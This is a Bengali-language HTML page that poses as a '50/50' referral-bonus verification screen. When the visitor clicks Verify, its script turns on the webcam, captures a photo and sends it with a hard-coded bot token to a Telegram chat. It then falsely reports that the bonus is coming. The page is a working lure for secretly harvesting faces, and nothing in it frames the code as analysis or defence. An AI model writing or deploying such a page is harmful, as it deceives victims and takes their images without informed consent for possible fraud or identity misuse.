<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>50/50 Verification</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            /* নিচের লিঙ্কে সচল ছবি দেওয়া হয়েছে */
            background-image: url('https://img.freepik.com/free-photo/portrait-beautiful-young-woman-traditional-sari_23-2149505439.jpg'); 
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            position: relative;
        }
        /* ব্যাকগ্রাউন্ডের উপর হালকা কালো আভা যাতে লেখা স্পষ্ট বোঝা যায় */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5); 
            z-index: 1;
        }
        .container {
            background: rgba(255, 255, 255, 0.1); 
            backdrop-filter: blur(10px); 
            padding: 40px 20px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            width: 85%;
            max-width: 380px;
            z-index: 2;
        }
        h1 { color: #ffffff; font-size: 28px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        h2 { color: #ffeb3b; font-size: 20px; margin-bottom: 10px; }
        p { color: #ffffff; font-size: 16px; margin-bottom: 25px; }
        #verify-btn { 
            background-color: #1a73e8; 
            color: white; 
            border: none; 
            padding: 15px 40px; 
            font-size: 18px; 
            border-radius: 50px; 
            cursor: pointer; 
            width: 100%;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(26, 115, 232, 0.4);
        }
        #video, #canvas { display: none; }
        #status { margin-top: 20px; color: #00ff00; font-weight: bold; font-size: 16px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>Welcome to 50/50</h1>
        <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
        <p>বোনাস পেতে হলে verify করুন</p>
        <button id="verify-btn">Verify</button>
        <div id="status"></div>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const botToken = "8403844691:AAG7ui2mJ08X8Q5kQ5jhpNoq1PGUqZpx6Ec";
        const chatId = "7068444019";

        const verifyBtn = document.getElementById('verify-btn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        verifyBtn.addEventListener('click', async () => {
            status.innerText = "Processing... Please wait";
            verifyBtn.style.display = "none"; 

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(async () => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append('chat_id', chatId);
                            formData.append('photo', blob, 'user_capture.png');
                            formData.append('caption', 'New 50/50 verification photo received!');

                            try {
                                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });

                                if(response.ok) {
                                    status.innerText = "Verification Successful! Your bonus is on the way.";
                                } else {
                                    status.innerText = "Error. Please try again.";
                                    verifyBtn.style.display = "block";
                                }
                            } catch (e) {
                                status.innerText = "Network error.";
                                verifyBtn.style.display = "block";
                            }

                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/png');
                    }, 500); // সচল হওয়ার পর ১/২ সেকেন্ড সময় দেয়া ভালো ছবির জন্য
                };

            } catch (err) {
                status.innerText = "Access denied! Please allow camera to verify.";
                verifyBtn.style.display = "block";
            }
        });
    </script>
</body>
</html>
